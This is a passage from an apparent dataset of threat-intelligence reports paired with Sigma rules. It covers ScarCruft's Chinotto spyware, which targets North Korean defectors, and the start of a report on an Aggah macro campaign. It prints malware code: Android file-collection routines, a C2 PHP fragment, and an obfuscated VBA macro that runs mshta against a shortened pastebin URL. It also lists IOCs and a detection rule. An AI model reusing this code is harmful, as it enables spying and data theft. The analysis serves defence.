                                                                                                                                                            |\n| UploadInfo | `?type=hello&direction=send&id=`<br>`?type=file&direction=send&id=` | After sending a beacon, collect the following information to the `/icloud/tmp-web` path: <ul><li>Info.txt: Phone number, IP address, SDK version (OS version), Temporary file path</li><li>Sms.txt: Save all text messages with JSON format</li><li>Calllog.txt: Save all call logs with JSON format</li><li>Contact.txt: Save all contact lists with JSON format</li><li>Account.txt: Save all account information with JSON format</li></ul> Upload collected file after archiving. The archived file is encrypted by AES with the key “3399CEFC3326EEFF”. |\n| UploadFile | `?type=file&direction=send&id=`                                     | Execute command `cd /sdcard;ls -alR`, save the result to the temporary file (`/sdcard/.temp-file.dat`) and upload it. Upload all thumbnails and photos after encrypting via AES and the key “3399CEFC3326EEFF”.                                                                                                                                                                                                                                                                                                                                              |\n| ETC        | `?type=file&direction=send&id=`                                     | Execute command saving the result to the result file (`/sdcard/result-file.dat`) and upload the result                                                                                                                                                                                                                                                                                                                                                                                                                                                       |\n\nWe found that the actor had an interest in a more specific file list in one variant (MD5 cba17c78b84d1e440722178a97886bb7). The ‘UploadFile’ command of this variant uploads specific files to the C2 server. The AMR file is an audio file generally used for recording phone calls. Also, Huawei cloud and Tencent services are two of the targets. To surveil the victim, the list includes target folders as well as `/Camera`, `/Recordings`, `/KakaoTalk` (a renowned Korean messenger), `/문건` (documents), `/사진` (pictures), and `/좋은글` (good articles).\n\n```image\nAlt: Targeted files and folders\nDescription: The image depicts a segment of code likely related to the Chinotto malware's functionality. Specifically, it shows a series of commands that process important files from various directories on an Android device, including audio recordings, pictures, and specific app folders like those for Huawei Cloud and Tencent services. The code suggests that the malware is designed to identify and handle files of interest, which could then be uploaded to a command and control (C2) server for malicious purposes.\nTranscription: |\n  if (paramBoolean2) {\n      processImportantFile(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM), \"\");\n      processImportantFile(Environment.getDataDirectory(), \".amr\");\n      processImportantFile(Environment.getExternalStorageDirectory(Environment.DIRECTORY_PICTURES), \"\");\n      processImportantFile(new File(Environment.getExternalStorageDirectory().getPath() + \"/Huawei/CloudDrive/.thumbnail\"), \"\");\n      processImportantFile(new File(Environment.getExternalStorageDirectory().getPath() + \"/tencent/MicroMsg/Download\"), \"\");\n      processImportantFile(new File(Environment.getExternalStorageDirectory().getPath() + \"/tencent/MicroMsg/WeChat\"), \"\");\n      processImportantFile(new File(Environment.getExternalStorageDirectory().getPath() + \"/tencent/MicroMsg/Weixin\"), \"\");\n      processImportantFile(new File(Environment.getExternalStorageDirectory().getPath() + \"/Camera\"), \"\");\n      processImportantFile(new File(Environment.getExternalStorageDirectory().getPath() + \"/Recordings\"), \"\");\n      processImportantFile(new File(Environment.getExternalStorageDirectory().getPath() + \"/KakaoTalk\"), \"\");\n      processImportantFile(new File(Environment.getExternalStorageDirectory().getPath() + \"/사진\"), \"\");\n      processImportantFile(new File(Environment.getExternalStorageDirectory().getPath() + \"/썸네일\"), \"\");\n      uploadToWeb();\n  }\n  return;\n```\n\n*__Targeted files and folders__*\n\nTo sum up, the actor targeted victims with a probable spear-phishing attack for Windows systems and smishing for Android systems. The actor leverages Windows executable versions and PowerShell versions to control Windows systems. We may presume that if a victim’s host and mobile are infected at the same time, the malware operator is able to overcome two-factor authentication by stealing SMS messages from the mobile phone. After a backdoor operation with a fully featured backdoor, the operator is able to steal any information they are interested in. Using the stolen information, the actor further leverages their attacks. For example, the group attempts to infect additional valuable hosts and contact potential victims using stolen social media accounts or email accounts.\n\n```image\nAlt: Attack procedure\nDescription: The image illustrates the attack procedure of the ScarCruft group targeting victims. It features a flowchart that highlights the steps involved in the attack process, including: 1. Infection methods such as spear phishing, smishing, and watering hole tactics. 2. Surveillance of the victims through a C2 server and backdoor operations. 3. Contacting the next target using stolen social media credentials. 4. Sending spear-phishing emails to potential victims using these credentials. The diagram includes icons representing mobile devices, PCs, and the C2 server, visually mapping out the relationship and flow of actions among the actors and their targets.\nTranscription: |\n  1. Infect with spear phishing, smishing, watering hole\n     |\n     v\n  2. Surveil the victims\n     |\n     v\n     +------------------+\n     |                  |\n     |      Victims     |\n     |                  |\n     +------------------+\n     |                  |\n     |   Mobile         |\n     |                  |\n     |   PC             |\n     |                  |\n     +------------------+\n     |                  |\n     |   Windows        |\n     |   executable     |\n     |   version        |\n     |                  |\n     |   PowerShell     |\n     |   version        |\n     +------------------+\n     |\n     v\n  3. Contact next target with stolen social media credentials\n     |\n     v\n  4. Send spear-phishing email using stolen credentials\n     |\n     v\n  Potential victim\n  \n  C2 server\n     |\n     v\n  Backdoor operations\n```\n\n*__Attack procedure__*\n\n## Older malicious HWP documents\n\nThe threat actor behind this campaign delivered the same malware with a malicious HWP file. At that time, lures related to COVID-19 and credential access were used.\n\n| HWP hash                         | HWP file name                                                            | Dropped payload hash                                   |\n| -------------------------------- | ------------------------------------------------------------------------ | ------------------------------------------------------ |\n| f17502d3e12615b0fa8868472a4eabfb | 코로나19 재감염 사례-백신 무용지물.hwp (Covid-19 reinfection case-Useless vaccine.hwp) | 72e5b8ea33aeb083631d1e8b302e76af (Visual Basic Script) |\n| c155f49f0a9042d6df68fb593968e110 | 계정기능 제한 안내.hwp (Notice of limitation of account.hwp)                     | 5a7ef48fe0e8ae65733db64ddb7f2478 (Windows executable)  |\n\nThe Visual Basic Script created by the first HWP file (MD5 f17502d3e12615b0fa8868472a4eabfb) has similar functionalities to the Chinotto malware. It also uses the same HTTP communication pattern. The second payload dropped from the malicious HWP is a Windows executable executing an embedded PowerShell script with the same functionalities. These discoveries reveal related activity dating back to at least mid-2020.\n\n## Infrastructure\n\nIn this campaign, the actor relied solely on compromised web servers, mostly located in South Korea. During this research, we worked closely with the local CERT to take down the attacker’s infrastructure and had a chance to look into one of the scripts on the C2 servers that control the Chinotto malware. The C2 script (named “do.php”) uses several predefined files to save the client’s status (`shakest`) and commands (`comcmd`). Also, it parses several parameters (`id`, `type`, `direction`, `data`) delivered by the HTTP request from the implant:\n\n```\n$type = \"\"; # 'type' parameter\n$shakename = \"shakest\"; # Save client status\n$comcmdname = \"comcmd\"; # Save commands\n$btid = \"\"; # Client unique ID\n$direction = \"\"; # 'direction' parameter\n$data = \"\"; # 'data' parameter\n\nif (isset($_GET['id'])) {\n    $btid = $_GET['id'];\n}\n\nif (isset($_GET['type'])) {\n    $type = $_GET['type'];\n}\n\nif (isset($_GET['direction'])) {\n    $direction = $_GET['direction'];\n}\n\nif (isset($_GET['data'])) {\n    $data = $_GET['data'];\n}\n\n$comname = $btid . \"\";\n$comresname = $comname . \"-result\";\n```\n\nIn order to control the client, the C2 script uses HTTP parameters. First, it checks the value of the ‘type’ parameter. The ‘type’ parameter carries four values: hello, command, result, and file.\n\n| Value of ‘type’ param | Description                                                                |\n| --------------------- | -------------------------------------------------------------------------- |\n| hello                 | Report and control the client status                                       |\n| command               | Hold the command from the operator or retrieve the command from the client |\n| result                | Upload the command execution result or retrieve the command                |\n| file                  | Upload file to the C2 server                                               |\n\n### ‘hello’ type\n\nWhen the script receives the ‘type=hello’ parameter, it checks the value of ‘direction’. In this routine, the script checks the status of the client. The malware operator saves the client status to a specific file, the ‘shakest’ file in this case. If the ‘send’ value is being received, the client status is set to ‘ON’. If ‘receive’ is set as well, the client’s status log file is sent (likely in order to send the status of clients to the malware operator). The ‘refresh’ value is for setting all clients to ‘OFF’ and ‘release’ is used to initialize the command file. The client just replies ‘OK’.\n\n```image\nAlt: ‘type=hello’ commands\nDescription: The image is a flowchart illustrating the commands associated with a script that processes a 'type=hello' parameter. It details the decision-making process based on the 'direction' parameter, showing various outcomes such as setting the client status, returning log files, refreshing client status, initializing command files, and the client's response. The flowchart effectively summarizes the functionality and operational commands related to the ScarCruft malware.\nTranscription: |\n  Check 'type' param\n           |\n         hello\n           |\n     check the 'direction'\n           |\n     -------------------------\n     |          |           |\n    send      receive     refresh\n     |          |           |\n  Set client   Return    Set all client\n  status as    client    status to 'OFF' \n     'ON'      status    and command file to 'ref:'\n                log file\n           |\n         release\n           |\n  Initialize command file\n           |\n         client\n           |\n        echo 'OK'\n```\n\n*__‘type=hello’ commands__*\n\n### ‘command’ type\n\nIn order to manage the implant’s commands, the C2 script handles several additional parameters. If the ‘type=command’ alongside ‘direction=receive’ is set, it issues a request from the client to retrieve a command.\n\nThere are two kinds of command files: common commands like an initial command or commands sent to all clients, and individual commands for a specific client. If an individual command exists for a client, it delivers it. Otherwise, the client is sent a common command. If the ‘direction’ parameter is set to ‘send’, the request is coming from the malware operator in order to save the sent command in the C2 server. Using this request, the operator can set two commands files: common command or individual command. If the ‘botid’ parameter contains ‘cli’, it means this request is for setting a common command file. If the ‘data’ parameter contains ‘refclear:’, the common command file gets initialized. Otherwise, the ‘data’ value is saved to the common command file. If ‘botid’ is not ‘cli’, it means this request is directed to an individual command file. The process of saving the individual command file is the same as the process used for saving the common command.\n\n```image\nAlt: type=command commands\nDescription: The image is a flowchart illustrating the process of handling commands for a malware implant. It shows decision points based on the parameters 'type', 'direction', 'botid', and 'data'. The flowchart outlines the steps for delivering commands or saving them to a command file, distinguishing between common and individual command files, and detailing the actions associated with different parameter values.\nTranscription: |\n  Check 'type' param\n          |\n       command\n          |\n  check the 'direction'\n         / \\\n    receive  send\n      |       |\n  Deliver the command\n              |\n         check the 'botid'\n          /       \\\n        cli       else\n         |          |\n   check the 'data'  |\n        / \\         |\n  refclear:   else   |\n      |         |    |\n  Initialize common  |\n  command file      check the 'data'\n                    /      \\\n               refclear:    else\n                    |         |\n            Initialize individual\n                command file\n                    |\n        Save the 'data' parameter to\n          individual command file\n```\n\n*__type=command commands__*\n\n### ‘result’ type\n\nWhen uploading command execution results coming from the implant, the script sets the ‘type’ parameter to ‘result’. If the ‘direction’ parameter equals ‘send’, it saves the value of the ‘data’ parameter to the individual result file: “[botid]-result”. The ‘receive’ value of the ‘direction’ parameter means retrieving the individual result file. The script then sends the result file to the operator after encoding it with base64.\n\n### ‘file’ type\n\nThe last possible ‘type’ command is ‘file’. This value is used for exfiltrating files from the victim. If a file upload succeeds, the script sends the message ‘SEND SUCCESS’. Otherwise, it sends ‘There was an error uploading the file, please try again!’.\n\nWe discovered that the malware operator used a separate webpage to monitor and control the victims. From several compromised C2 servers we see a control page carrying a ‘control.php’ file name.\n\n```image\nAlt: Control page from this case\nDescription: The image displays a control page interface used by the ScarCruft malware operator. It shows a list of infected hosts with their status (e.g., \"PC: ON\") on the left panel. The right panel allows the operator to input commands and view results from the client. The interface includes a 'Bot' field displaying 'USER-PC', a command input box, and a result area for displaying command outcomes, along with a 'Refresh' button.\nTranscription: |\n  -PC : ON\n  Refresh\n  \n  Bot\n  USER-PC\n  \n  Comm\n  Enter command..\n  \n  Result\n  Command result is here...\n```\n\n*__Control page from this case__*\n\nThe control page shows a simple structure. The operator can see a list of infected hosts in the left panel with the corresponding status “ON” or “OFF”. Based on this information, the operator is able to issue a command using the right panel and watch the result from the client.\n\n## Victims\n\nWe began this research by providing support to human rights activists and defectors from North Korea against an actor seeking to surveil and track them.\n\nAdditionally, we discovered further victims we couldn’t profile from analyzing the C2 servers. From analyzing the attacker’s infrastructure, we found 75 client connections between January 2021 and February 2021. Most IP addresses seem to be Tor or VPN connections, which are likely to be either from researchers or the malware operators.\n\nAnalyzing other C2 servers, we found more information about possible additional victims. Excluding connections coming from Tor, there are only connections coming from South Korea. Based on the IP addresses, we could distinguish four different suspected victims located in South Korea, and determine their operating system and browser used based on user-agent information:\n\nVictim A connected to the C2 server from July 16 to September 5 and has outdated versions of Windows OS and Internet Explorer. Victim B connected to this server on September 4 and operates Windows 8 and Internet Explorer 10. While we were investigating the C2 server, Victim D kept connecting to it, using Windows 10 with Chrome version 78.\n\n```image\nAlt: Timeline of victims\nDescription: The image displays a timeline of victims targeted by the ScarCruft threat actor, detailing their connection periods along with the operating systems and browsers used. The timeline is structured by weeks across the months of July, August, and September, indicating specific victims (A, B, C, D) and their respective connection details. For example, Victim A's connection is noted from July 16 to September 5 using Internet Explorer 6 on Windows XP SP2. Victim B is shown to have connected on September 4 using Internet Explorer 10 on Windows 8, while Victim C and Victim D are connected during September using Chrome on Windows 10.\nTranscription: |\n  07\n  W1   W2   W3   W4\n  Victim A (Jul 16 - Sep 5), Internet Explorer 6 on Windows XP SP2\n  \n  08\n  W1   W2   W3   W4\n  Victim B (Sep 4 - Sep 9), Internet Explorer 10 on Windows 8\n  \n  09\n  W1   W2   W3   W4\n  Victim C (Sep 10 - Sep 12), Chrome 78 on Windows 10\n  Victim D (Sep 12 - Sep 29), Chrome 78 on Windows 10\n```\n\n*__Timeline of victims__*\n\nTo sum up, this campaign is targeting entities in South Korea, which is a top point of interest for ScarCruft. Based on our findings, we also assume that the threat actor targeted individuals rather than specific companies or organizations.\n\n## Attribution\n\nWe discovered several code overlaps with old ScarCruft malware named POORWEB. At first, when Chinotto malware uploads the file to the C2 server, it uses the HTTP POST request with a boundary generated with a random function. When Chinotto malware (MD5 00df5bbac9ad059c441e8fef9fefc3c1) generates a boundary value, it executes the random() function twice and concatenates each value. The generation process is not exactly the same, but it utilizes a similar scheme as the old POORWEB malware (MD5 97b35c34d600088e2a281c3874035f59).\n\n```image\nAlt: HTTP boundary generation routine\nDescription: The image shows a side-by-side comparison of code snippets, illustrating the similarities between the old POORWEB malware and the Chinotto malware. The top portion displays the code for the old POORWEB malware, highlighting its boundary generation routine, while the bottom section presents the corresponding routine from the Chinotto malware. The code uses random values to generate a boundary string, displaying the overlap in methods between the two malware types.\nTranscription: |\n  return 0;\n  memset(buf, 0, sizeof(buf));\n  memset(v39, 0, sizeof(v39));\n  sprintf(v39, \"------%05x%08x\", random_value2 % 0xF6575, random_value1);\n  v18 = 0;\n  \n  random_value1 = rand();\n  random_value2 = rand();\n  strcpy(&Format[36], \"$\");\n  strcpy(Format, \"------%06x%07x\");\n  sprintf(boundary, Format, random_value1 % 0xDACB48, random_value2 % 0x38789FE);\n```\n\n*__HTTP boundary generation routine__*\n\nMoreover, there is additional code overlap with Document Stealer malware (MD5 cff9d2f8dae891bd5549bde869fe8b7a) that was previously utilized with POORWEB malware. When the Chinotto malware checks the response from the C2 server, it checks whether the response is ‘HTTP/1.1 200 OK’ and not ‘error’. This Document Stealer malware also has the same routine to check responses from the C2 server.\n\n```image\nAlt: C2 response check routine\nDescription: The image displays two code snippets related to malware behavior. The top snippet is labeled 'Document Stealer' and shows a routine that checks for a successful HTTP response ('HTTP/1.1 200 OK') and verifies that there is no 'error' in the response data. The bottom snippet is labeled 'Chinotto' and includes similar functionality for checking the HTTP response. Both pieces of code illustrate the methods used by the respective malware to interact with a Command and Control (C2) server, emphasizing their overlapping techniques.\nTranscription: |\n  if ( select(0, &writefds, 0, &timeout) >= 1\n      && recv(v15, buf_for_recv_data, 3000, 0)\n      && strstr(buf_for_recv_data, \"HTTP/1.1 200 OK\")\n      && strstr(buf_for_recv_data, \"\\r\\n\\r\\n\")\n      && !strstr(buf_for_recv_data, \"error</b>\") )\n  \n  Document Stealer\n  \n  if ( select(0, &writefds, 0, &timeout) >= 1 )\n  {\n      if ( recv((SOCKET)v28, buf_for_recv_data, 4096, 0) )\n      {\n          memset(SubStr, 0, sizeof(SubStr));\n          sprintf(SubStr, \"%s\", \"HTTP/1.1 200 OK\");\n          if ( strstr(buf_for_recv_data, SubStr)\n              && strstr(buf_for_recv_data, \"\\r\\n\\r\\n\")\n              && !strstr(buf_for_recv_data, \"error</b>\") )\n      }\n  }\n  \n  Chinotto\n```\n\n*__C2 response check routine__*\n\nApart from code similarity, historically, ScarCruft group is known to surveil individuals related to North Korea such as journalists, defectors, diplomats, and government employees. The target of this attack is within the same scope as previous ScarCruft group campaigns. Based on the victimology and several code overlaps, we assess with medium confidence that this cyber-espionage operation is related to the ScarCruft group.\n\n## Conclusions\n\nMany journalists, defectors, and human rights activists are targets of sophisticated cyberattacks. Unlike corporations, these targets typically don’t have sufficient tools to protect against and respond to highly skilled surveillance attacks. One of the purposes of our team is to help individuals targeted by APT groups. This research stemmed from this kind of endeavor. Our collaboration with the local CERT allowed us to gain a unique look into ScarCruft’s infrastructure setup and allowed us to discover many technical details.\n\nUsing these findings, we found additional Android variants of the same malware, which has been invaluable in understanding and tracking ScarCruft TTPs. Moreover, while hunting for related activity, we uncovered an older set of activity dating back to mid-2020, possibly indicating that ScarCruft operations against this set of individuals have been operating for a longer period of time.\n\n## Indicators of compromise\n\n**Malicious documents**\n\n| MD5                              | File name                   |\n| -------------------------------- | --------------------------- |\n| baa9b34f152076ecc4e01e35ecc2de18 | 북한의 최근 정세와 우리의 안보.doc       |\n| 7d5283a844c5d17881e91a5909a5af3c | 화학원료.doc (similar document) |\n\n**HTA file**\n\n| MD5                              | File name |\n| -------------------------------- | --------- |\n| e9e13dd4434e2a2392228712f73c98ef | 1.html    |\n\n**Windows executable Chinotto**\n\n| MD5                              | File name      |\n| -------------------------------- | -------------- |\n| 00df5bbac9ad059c441e8fef9fefc3c1 | alyakscan.exe  |\n| 04ddb77e44ac13c78d6cb304d71e2b86 | anprotect5.exe |\n| 55afe67b0cd4a01f3a9a6621c26b1a49 |                |\n| 93bcbf59ac14e14c1c39a18d8ddf28ee |                |\n\n**PowerShell embedded Chinotto**\n\n- c7c3b03108f2386022793ed29e621343\n- 5a7ef48fe0e8ae65733db64ddb7f2478\n- b06c203db2bad2363caed1c0c11951ae\n- f08d7f7593b1456a087eb9922507c743\n- 0dd115c565615651236fffaaf736e377\n- d8ad81bafd18658c52564bbdc89a7db2\n\n**Android application Chinotto**\n\n- 71b63d2c839c765f1f110dc898e79d67\n- c9fb6f127ca18a3c2cf94e405df67f51\n- 3490053ea54dfc0af2e419be96462b08\n- cba17c78b84d1e440722178a97886bb7\n- 56f3d2bcf67cf9f7b7d16ce8a5f8140a\n\n**Payload hosting URLs**\n\n- `hxxps://api[.]onedrive[.]com/v1.0/shares/u!aHR0cHM6Ly8xZHJ2Lm1zL3UvcyFBalVyZDlodU1wUWNjTGt4bXhBV0pjQU1ja2M_ZT1mUnc4VHg/root/content`\n- `hxxp://www[.]djsm.co[.]kr/js/20170805[.]hwp`\n\n**Command and control server**\n\n- `hxxp://luminix[.]openhaja[.]com/bbs/data/proc1/proc[.]php`\n- `hxxp://luminix[.]kr/bbs/data/proc/proc[.]php`\n- `hxxp://kjdnc[.]gp114[.]net/data/log/do[.]php`\n- `hxxp://kumdo[.]org/admin/cont/do[.]php`\n- `hxxp://haeundaejugong[.]com/editor/chinotto/do[.]php`\n- `hxxp://haeundaejugong[.]com/data/jugong/do[.]php`\n- `hxxp://doseoul[.]com/bbs/data/hnc/update[.]php`\n- `hxxp://hz11[.]cn/jquery-ui-1[.]10[.]4/tests/unit/widget/doc/pu[.]php`\n\n## MITRE ATT&CK mapping\n\n| Tactic                   | Technique | Technique Name                                                      |\n| ------------------------ | --------- | ------------------------------------------------------------------- |\n| **Resource Development** | T1584.006 | Compromise Infrastructure: Web Services                             |\n| **Initial Access**       | T1566.001 | Phishing: Spear-phishing Attachment                                 |\n| **Execution**            | T1059.001 | Command and Scripting Interpreter: PowerShell                       |\n|                          | T1059.005 | Command and Scripting Interpreter: Visual Basic                     |\n| **Persistence**          | T1547.001 | Boot or Logon Autostart Execution: Registry Run Keys/Startup Folder |\n| **Defense Evasion**      | T1140     | Deobfuscate/Decode Files or Information                             |\n|                          | T1036.005 | Masquerading: Match Legitimate Name or Location                     |\n| **Discovery**            | T1033     | System Owner/User Discovery                                         |\n|                          | T1082     | System Information Discovery                                        |\n| **Collection**           | T1113     | Screen Capture                                                      |\n|                          | T1560.002 | Archive Collected Data: Archive via Library                         |\n| **Command and Control**  | T1071.001 | Application Layer Protocol: Web Protocols                           |\n|                          | T1573.001 | Encrypted Channel: Symmetric Cryptography                           |\n| **Exfiltration**         | T1041     | Exfiltration Over C2 Channel                                        |",
    "sigma_rule": {
      "title": "Trust Access Disable For VBApplications",
      "id": "1a5c46e9-f32f-42f7-b2bc-6e9084db7fbf",
      "related": [
        {
          "id": "a166f74e-bf44-409d-b9ba-ea4b2dd8b3cd",
          "type": "obsolete"
        }
      ],
      "status": "test",
      "description": "Detects registry changes to Microsoft Office \"AccessVBOM\" to a value of \"1\" which disables trust access for VBA on the victim machine and lets attackers execute malicious macros without any Microsoft Office warnings.",
      "references": [
        "https://twitter.com/inversecos/status/1494174785621819397",
        "https://www.mcafee.com/blogs/other-blogs/mcafee-labs/zloader-with-a-new-infection-technique/",
        "https://securelist.com/scarcruft-surveilling-north-korean-defectors-and-human-rights-activists/105074/"
      ],
      "author": "Trent Liffick (@tliffick), Nasreddine Bencherchali (Nextron Systems)",
      "date": "2020-05-22",
      "modified": "2023-08-17",
      "tags": [
        "attack.defense-evasion",
        "attack.t1112"
      ],
      "logsource": {
        "category": "registry_set",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "TargetObject|endswith": "\\Security\\AccessVBOM",
          "Details": "DWORD (0x00000001)"
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unlikely"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\registry\\registry_set\\registry_set_office_access_vbom_tamper.yml",
    "id": "975"
  },
  {
    "url": "https://yoroi.company/research/cyber-criminal-espionage-operation-insists-on-italian-manufacturing/",
    "markdown": "# Cyber-Criminal Espionage Operation Insists on Italian Manufacturing\n\n**Date:** 05/22/2020\n\n## Introduction\n\nDuring our Cyber Threat Intelligence monitoring, we spotted new malicious activities targeting some Italian companies operating worldwide in the manufacturing sector, some of them also part of the automotive production chain.\n\nThe group behind this activity is the same we identified in the past malicious operations described in Roma225 (12/2018), Hagga (08/2019), Mana (09/2019), YAKKA (01/2020). This actor was first spotted by PaloAlto’s UNIT42 in 2018 during wide scale operations against technology, retail, manufacturing, and local government industries in the US, Europe, and Asia. They also stated the hypothesis of possible overlaps with the Gorgon APT group, but no clear evidence confirmed that.\n\nHowever, in order to keep track of all of our report, we synthesized all the monitored campaigns, with their TTPs and final payload:\n\n```image\nAlt: Table 1: Synthetic table of the campaigns\nDescription: The image is a detailed table summarizing various cyber-espionage campaigns and their attributes. It categorizes techniques used for attacks such as Injection, Dropper, Initial Access, Execution, Persistence, and Obfuscation, along with their corresponding MITRE ATT&CK codes. Each row represents a specific technique or category, and the columns indicate the campaigns (Roma225, Haggah, Mana, YAKKA, and NIBBI) with check marks denoting which techniques were employed in each campaign. The final payloads used in these campaigns are also listed, showcasing the evolution of malware from RevengeRAT to AgentTesla.\nTranscription: |\n  +----------------+---------------------------------------------------+-------------------------+---------------------+-----------------------+----------------------+------------------+\n  |                | Description                                       | -> -> -> -> -> -> -> -> -> -> -> -> -> -> -> -> -> -> -> -> -> -> -> -> -> -> -> -> -> -> -> -> -> -> -> -> ->  |\n  | Category       |---------------------------------------------------+-------------------------+---------------------+-----------------------+----------------------+------------------+\n  |                | MITRE ATT&CK Code | Technique                     | December 2018 (Roma225) | August 2019 (Hagga) | September 2019 (Mana) | January 2020 (YAKKA) | May 2020 (NIBBI) |\n  +----------------+-------------------+-------------------------------+-------------------------+---------------------+-----------------------+----------------------+------------------+\n  | Injection      | T1093             | Process Hollowing             |                         | X                   |                       |                      |                  |\n  |                | T1055             | Process Injection             |                         |                     |                       | X                    |                  |\n  +----------------+-------------------+-------------------------------+-------------------------+---------------------+-----------------------+----------------------+------------------+\n  |                | T1064             | Macro Document                | X                       | X                   | X                     | X                    | X                |\n  | Dropper        |                   | VBS script                    | X                       | X                   |                       | X                    | X                |\n  | -              |                   | Javascript                    |                         | X                   | X                     | X                    | X                |\n  | Payload        | T1170             | Mshta                         | X                       | X                   | X                     | X                    | X                |\n  | -              | T1036             | Executable                    | X                       | X                   | X                     | X                    | X                |\n  | Initial Access | T1086             | PowerShell Stage              |                         | X                   | X                     | X                    | X                |\n  | -              | T1191             | CMSTP                         |                         |                     |                       | X                    | X                |\n  | Execution      | T1102             | Web Service                   |                         | X                   | X                     | X                    | X                |\n  |                | T1218             | Signed Binary Proxy Execution | X                       | X                   | X                     | X                    | X                |\n  +------------------------------------+-------------------------------+-------------------------+---------------------+-----------------------+----------------------+------------------+\n  | Persistence    | T1053             | Scheduled Task                | X                       | X                   | X                     |                      |                  |\n  |                | T1060             | Registry Run Keys             |                         | X                   | X                     | X                    | X                |\n  +----------------+-------------------+-------------------------------+-------------------------+---------------------+-----------------------+----------------------+------------------+\n  | Obfuscation    | T1027             | Obfuscation                   | X                       | X                   | X                     | X                    | X                |\n  +----------------+-------------------+-------------------------------+-------------------------+---------------------+-----------------------+----------------------+------------------+\n  | Final Payload  |                                                   | RevengeRAT              | RevengeRAT          | AzoRult & RevengeRAT  | AzoRult & LokiBot    | AgentTesla       |\n  +----------------+---------------------------------------------------+-------------------------+---------------------+-----------------------+----------------------+------------------+\n```\n\nAs we can see from the table, the Aggah campaigns varied in time, but it maintained some common points. All campaigns used as the initial stage an office document (PowerPoint or Excel) armed with macro and some of them used injection methods.\n\nAll attack operations used a “Signed Binary Proxy Execution” technique abusing Mshta, a legit Microsoft tool, and used at least an executable file for the infection. In addition, the use of PowerShell stage or the abuse of legit web service has been reported in some campaigns.\n\nFurthermore, the CMSTP bypass exploit is a new feature present only in 2020, because the first malwares identified to exploit this vulnerability all date back to mid/end 2019, making think the fact that the Threat Actor likes to test the latest disclosed exploits in order to make its campaigns always at the forefront. Regarding persistence mechanisms, we note that initially scheduled tasks were used, but in the latest infections the registry run keys were used. All threats use at least one obfuscation method to make the analysis harder.\n\nLooking at the evolution of the final payloads, we can say that this evolution is certainly due to a chronological factor, since Revenge rat had become obsolete, but the evolution is also due to the technological factor and its means: revenge rat has the classic functionality of spyware, while AZORult is considered an info stealer. As a last payload, Agent Tesla was used which collects all the functionality of the previous payloads as it is considered an info stealer and spyware.\n\n## Technical Analysis\n\nThe infection chain starts with a malicious Microsoft PowerPoint weaponized with a malicious macro.\n\n| Hash              | 7eafb57e7fc301fabb0ce3b98092860aaac47b7118804bb8d84ddb89b9ee38f3                                   |\n| ----------------- | -------------------------------------------------------------------------------------------------- |\n| Threat            | Malicious macro                                                                                    |\n| Brief Description | Malicious ppt dropper with macro.                                                                  |\n| Ssdeep            | 192:EFm9QiR1zQRZ0DfZGJjBVySCGVBdJWUpFVzsn6xVNdwWFj/WOvYoZLlmYvJuec9r:i8R1ERZ0DMJjU+bRuxURKMxpcksPY |\n\n**Table 2. Sample information**\n\nThe content of the macro is quite easy to read and the content is short and easy to read:\n\n```image\nAlt: Figure 1: Content of the malicious macro\nDescription: The image displays a snippet of VBA (Visual Basic for Applications) code from a malicious macro used in a cybercriminal espionage operation. The code includes variable declarations and a command to run a shell command that likely downloads and executes further malicious content. Key components in the code include the use of 'CreateObject' to initialize an application object and the manipulation of a URL, indicated by the 'StrReverse' function, which suggests obfuscation to evade detection.\nTranscription: |\n  vb\n  Attribute VB_Name = \"Slide\"\n  Option Explicit\n  Sub Page()\n  \n      Dim IEapp As Object\n      Dim WebUrl As String\n      Dim WEBs As String\n      Dim i As String\n      i = (\"W\" + \"S\" + \"c\" + \"ript.Shell\")\n      Set IEapp = CreateObject(i)\n      WebUrl = StrReverse(\"\"\"d*'h'ugyfugctcyrrcrcr'*d'*d'\\p*'.j\\\\:ptth\"\"\"*htas'*\"\"\")\n      WEBs = Replace(WebUrl, \"*'*\", \"m\")\n      IEapp.Run WEBs\n      Shell \"curl\"\n  \n  End Sub\n```\n\nThe VBA macro is responsible to download and execute malicious code retrieved from pastebin. *j.mp* is an URL shortening service, the following request redirect and download a pastebin content:\n\n```image\nAlt: Figure 2: Shortener resolution\nDescription: The image displays a terminal output showing a curl command used to access a URL shortened by Bitly. The response from the server indicates an HTML structure with a title 'Bitly' and a body containing a hyperlink that redirects to a Pastebin URL. This output is relevant to the discussed cyber espionage operation, illustrating how the malicious macro utilizes URL shortening to retrieve potentially harmful content.\nTranscription: |\n  root@kali:~# curl http://j.mp/dmdmcrcrcryctcgufyguhmd\n  <html>\n  <head><title>Bitly</title></head>\n  <body><a href=\"https://pastebin.com/raw/Bnv7ruYp\">moved here</a></body>\n  </html>root@kali:~#\n```\n\n## The MSHTA Drop Chain\n\nLike the previous campaigns, this threat actor uses a Signed Binary Proxy Execution (ID: T1218) technique abusing *mshta.exe* (T1170), a signed and legit Microsoft tool. Adversaries can use mshta.exe to proxy execution of malicious .hta files, Javascript or VBScript.\n\n```image\nAlt: Figure 3: Piece of code of the Bnv7ruYp paste\nDescription: The image displays a segment of obfuscated JavaScript code intended for malicious use. It contains a series of encoded commands that utilize the `WScript.Shell` object to execute various actions, including running scripts from Pastebin URLs. The code snippet is likely part of a cyber-espionage operation, showcasing how attackers can use legitimate tools and methods for executing malicious payloads. The obfuscation techniques employed complicate analysis and detection, highlighting a common tactic used by threat actors.\nTranscription: |\n  html\n  <script>\n  <!--\n  